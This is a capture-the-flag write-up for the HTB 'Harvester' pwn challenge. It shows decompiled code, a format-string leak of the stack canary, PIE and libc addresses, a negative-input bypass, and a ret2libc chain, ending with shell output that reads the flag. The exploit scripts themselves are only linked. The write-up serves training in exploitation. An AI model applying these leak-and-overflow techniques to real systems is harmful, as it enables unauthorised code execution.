### Harvester HTB Apocalypse 2021

### Binary Exploitation 

#### TL;DR Solution: Use a format string to leak canary, piebase address & perform a ret2libc attack 

#### Basic File Checks

```
┌──(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/harvester]
└─$ file harvester 
harvester: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c38bca86a80d4c3750dba23da387213e5e8b96d4, not stripped
                                                                                                                                                                                            
┌──(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/harvester]
└─$ checksec --format=json --file=harvester | jq
{
  "harvester": {
    "relro": "full",
    "canary": "yes",
    "nx": "yes",
    "pie": "yes",
    "rpath": "no",
    "runpath": "yes",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "2"
  }
}
```

We're working with a x64 binary and all protections are enabled 💀

A libc file is given so i'll use patchelf to path the binary to use the libc file given
![image](https://user-images.githubusercontent.com/113513376/222286975-ca438f26-0fec-4a4b-bf40-edc31be08fac.png)

Lets run it to know what it does
![image](https://user-images.githubusercontent.com/113513376/222261870-ee0c20ab-040d-49df-a58a-3e0345bdd441.png)
![image](https://user-images.githubusercontent.com/113513376/222261951-5a99e553-642d-4907-89cf-405efe793fd2.png)

Using ghidra i'll decompile the binary

Here's the main function
![image](https://user-images.githubusercontent.com/113513376/222271203-635993cf-3642-4f7f-b2b2-944a628800a6.png)

```
undefined8 main(void)

{
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  printf("\x1b[1;36m");
  printstr(&banner);
  harvest();
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We see what it does:

```
1. Prints the banner 
2. Calls function harvest()
```

Here's the decompiled harvest() function
![image](https://user-images.githubusercontent.com/113513376/222271470-f6853b20-270b-4867-9f6f-74914288057f.png)

```
void harvest(void)

{
  long in_FS_OFFSET;
  int option;
  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  while( true ) {
    while( true ) {
      while( true ) {
        check_pie(pie);
        option = 0;
        menu();
        __isoc99_scanf(&DAT_00101202,&option);
        if (option != 2) break;
        inventory();
      }
      if (option < 3) break;
      if (option == 3) {
        stare();
      }
      else {
        if (option != 4) goto LAB_00100ef0;
        run();
      }
    }
    if (option != 1) break;
    fight();
  }
LAB_00100ef0:
  printf("\x1b[1;31m");
  printstr("This was never an option!\n");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

From the code here's whats going on:

```
1. A loop is called which does the following below
2. Recieves our input then does some checks
3. If our input is 1 it calls the fight() function
4. If our input is 2 it calls the inventory() function
5. If our input is 3 it calsl the stare() function
6. If our input is 4 it calls the run() function
7. Else if our input isn't to any of it, it exits
```

Here's the decompiled code for all function

Fight() 
![image](https://user-images.githubusercontent.com/113513376/222272666-780fc948-4b3a-418e-92d9-18fea4e51399.png)

```
void fight(void)

{
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("\x1b[1;36m");
  printstr("\nChoose weapon:\n");
  printstr(&DAT_00101138);
  read(0,&input,5);
  printstr("\nYour choice is: ");
  printf((char *)&input);
  printf("\x1b[1;31m");
  printstr("\nYou are not strong enough to fight yet.\n");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Inventory()
![image](https://user-images.githubusercontent.com/113513376/222272998-d25c75bb-6892-4b67-adef-8bb797467d52.png)

```
void inventory(void)

{
  long in_FS_OFFSET;
  int input;
  char local_13 [3];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  show_pies(pie);
  printstr("\nDo you want to drop some? (y/n)\n> ");
  read(0,local_13,2);
  if (local_13[0] == 'y') {
    printstr("\nHow many do you want to drop?\n> ");
    __isoc99_scanf(&%d,&input);
    pie = pie - input;
    if (pie < 1) {
      printstr(&result);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    show_pies(pie);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Stare()
![image](https://user-images.githubusercontent.com/113513376/222273259-a23424d7-eda9-4e30-87e5-994a024806b2.png)

```
void stare(void)

{
  long in_FS_OFFSET;
  undefined input [40];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("\x1b[1;36m");
  printstr("\nYou try to find its weakness, but it seems invincible..");
  printstr("\nLooking around, you see something inside a bush.");
  printf("\x1b[1;32m");
  printstr(&DAT_0010129a);
  pie = pie + 1;
  if (pie == 22) {
    printf("\x1b[1;32m");
    printstr("\nYou also notice that if the Harvester eats too many pies, it falls asleep.");
    printstr("\nDo you want to feed it?\n> ");
    read(0,input,64);
    printf("\x1b[1;31m");
    printstr("\nThis did not work as planned..\n");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Run()
![image](https://user-images.githubusercontent.com/113513376/222273380-fcbfd4c0-2f5e-4a30-892d-a136bf670ea7.png)

```
void run(void)

{
  printf("\x1b[1;36m");
  printstr("You ran away safely!\n");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

From this code we can tell the vulnerability lays in the stare() and fight() function

The fight function is vulnerable to a format string vulnerability

```
  read(0,&input,5);
  printstr("\nYour choice is: ");
  printf((char *)&input);
```

We can see that it reads 5 bytes of our input and prints it our without using a format specifier

While the stare() function is vulnerable to buffer overflow

```
void stare(void)

{
  long in_FS_OFFSET;
  undefined input [40];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf("\x1b[1;36m");
  printstr("\nYou try to find its weakness, but it seems invincible..");
  printstr("\nLooking around, you see something inside a bush.");
  printf("\x1b[1;32m");
  printstr(&DAT_0010129a);
  pie = pie + 1;
  if (pie == 22) {
    printf("\x1b[1;32m");
    printstr("\nYou also notice that if the Harvester eats too many pies, it falls asleep.");
    printstr("\nDo you want to feed it?\n> ");
    read(0,input,64);
    printf("\x1b[1;31m");
    printstr("\nThis did not work as planned..\n");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We see that it reads 64 bytes of data into a buffer that can only hold up to 40 bytes of data but we need to bypass a check for us to reach the vulnerable 
part of the program and the check confirms if the value of pie is equal to 22

Here's the function that makes us of getting a pie 

```
void inventory(void)

{
  long in_FS_OFFSET;
  int input;
  char local_13 [3];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  show_pies(pie);
  printstr("\nDo you want to drop some? (y/n)\n> ");
  read(0,local_13,2);
  if (local_13[0] == 'y') {
    printstr("\nHow many do you want to drop?\n> ");
    __isoc99_scanf(&%d,&input);
    pie = pie - input;
    if (pie < 1) {
      printstr(&result);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    show_pies(pie);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We see that it reads our input then does a math operation of the initial pie value subtract by our input 

Also you should notice that no form of check is done to know if we input a negative number!! sweet 

The binary has all protections enabled so trying to overflow the buffer will cause the canary to trigger

Here's how the exploit is going to be:

```
1. Leak stack canary address
2. Leak pie address 
3. Leak libc address
```

Since we can't really do something like `%1$p %2$p` i'll just keep on making the script call fight() since its a loop

Here's my fuzz script [Fuzz](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/practice/harvester/fuzz.py)

Before i run it i'll disable aslr 

```
Diasble aslr: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Now i'll run the fuzz script
![image](https://user-images.githubusercontent.com/113513376/222279472-d2234bee-3827-474b-a5aa-221f6efcd2ef.png)

We can see some addresses but it might be quite convincing to know the canary offset since we can see about 3 addresses ending with `00` 

I'll run the script again and compare the two results
![image](https://user-images.githubusercontent.com/113513376/222279948-ed6bc180-fce4-4a23-81eb-42ca8fcaf988.png)

But still it looks convincing anyways i'll open up gdb-pwndgb to get the real canary offset

```
gdb-pwngdb harvester
break main
run
```

Now if you notice the 3rd offset it looks like a libc address i can confirm what it is
![image](https://user-images.githubusercontent.com/113513376/222280520-8ffcdf92-94d4-40d6-8909-738b76c19612.png)

Cool its a libc address and its name is `nanosleep`

Also we need to get an address which will make us calculate the offset to the real binary address
![image](https://user-images.githubusercontent.com/113513376/222281633-318ec2d3-494e-4384-9ef8-6b9802540f7e.png)

I like using main()

So with gdb-pwngdb i'll calculate the offset needed to get to the main address
![image](https://user-images.githubusercontent.com/113513376/222282028-e19ebbb2-8bb8-4115-a306-dd3516686fcd.png)

With that set i need to get the offset of the stack canary
![image](https://user-images.githubusercontent.com/113513376/222282751-e2a2a0a8-4665-4aa5-945c-d0afc9c4d1ac.png)

```
gdb-pwngdb harvester
break main
ni
ni
ni
x $rax
```

We see that the canary is `0xa6c6c3a056a4cb00` now lets continue the program execution
![image](https://user-images.githubusercontent.com/113513376/222282999-c6fe53db-1b72-4c24-b6f1-801d1e2fd605.png)

```
continue
```

Looking at it shows that the offset is not at offset 11 cause its value isn't equal to `0x6da4dbd944578d00`

I'll repeat the same step for offset

```
%15$p
%19$p
%39$p
```

Note that the canary address always changes each time the program runs

After trying it i got that the offset to canary is at offset 19
![image](https://user-images.githubusercontent.com/113513376/222283415-3d5ac62e-3f8a-4fd2-9eed-73745706dc7b.png)
![image](https://user-images.githubusercontent.com/113513376/222283499-11cf4c67-4429-4629-8206-76df50976b6d.png)

Cool now that we know that and we have everything neccessary to craft the exploit 

Lets perform ret2libc. Since initially we leaked the libc address of nanosleep we can now calculate the value of the libc base address

Also note that we need to subtract 35 from the leaked nanosleep address so that we can get to the base address of nanosleep
![image](https://user-images.githubusercontent.com/113513376/222284388-5016701b-a1be-4679-9b8c-fdc10799bc7d.png)

```
pwndbg> x 0x7ffff7e983b3
0x7ffff7e983b3 <__GI___clock_nanosleep+35>:     0x66c3d8f7
pwndbg> x 0x7ffff7e983b3 - 35
0x7ffff7e98390 <__GI___clock_nanosleep>:        0x7403ff83
pwndbg> 
```

With that ready i need a pop_rdi gadget to pop the value of sh in system also i will need a ret address to allign the stack to prevent movaps stack allignment
![image](https://user-images.githubusercontent.com/113513376/222285118-913d17ad-fd9f-4fea-97c0-91b96e7724a1.png)

So here's my exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/practice/harvester/exploit.py)

Running it works 👻

```
┌──(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/harvester]
└─$ python3 exploit.py                                              
[+] Starting local process './harvester': pid 30985
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Canary address: 0x38d5ddbf06eb8b00
[*] Leaked Pie address: 0x555555400f90
[*] Piebase address: 0x555555400000
[*] Leaked nano address: 0x7ffff7e98390
[*] Libc base address 0x7ffff7dc46a0
[*] /bin/sh address 0x7ffff7f5a6d1
[*] System address 0x7ffff7e109d0
[*] Switching to interactive mode
$ ls -al
total 2032
drwxr-xr-x  2 mark mark    4096 Mar  2 00:07 .
drwxr-xr-x 31 mark mark    4096 Mar  2 00:05 ..
-rw-------  1 mark mark    1418 Mar  2 00:07 .gdb_history
-rw-r--r--  1 mark mark    3802 Mar  1 16:40 exploit.py
-rw-r--r--  1 mark mark      37 Mar  1 14:18 flag.txt
-rw-r--r--  1 mark mark    1653 Mar  1 23:24 fuzz.py
-rwxr-xr-x  1 mark mark   20761 Mar  2 00:06 harvester
-rw-r--r--  1 mark mark 2030928 Mar  2 00:04 libc.so.6
$ cat flag.txt
CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
$ 
```

And we're done 

<br> <br>
[Back To Home](../../../index.md)

</br>
